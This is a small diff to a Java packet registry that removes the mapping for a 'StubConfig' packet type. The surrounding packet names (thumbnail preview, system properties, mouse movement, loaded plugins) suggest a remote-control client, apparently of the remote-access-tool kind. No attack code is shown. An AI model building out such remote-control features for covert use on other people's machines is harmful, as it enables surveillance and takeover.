@@ -93,7 +93,7 @@ public abstract class AbstractIncomingPacket {
 		PACKETS_INCOMING.put((short) 85, Packet85ThumbnailPreview.class);
 		PACKETS_INCOMING.put((short) 86, Packet86ErrorLog.class);
 		PACKETS_INCOMING.put((short) 87, Packet87DeleteErrorLog.class);
-		PACKETS_INCOMING.put((short) 88, Packet88StubConfig.class);
+		// 88
 		PACKETS_INCOMING.put((short) 89, Packet89LoadedPlugins.class);
 		PACKETS_INCOMING.put((short) 90, Packet90SystemProperties.class);
 		PACKETS_INCOMING.put((short) 91, Packet91MouseMove.class);
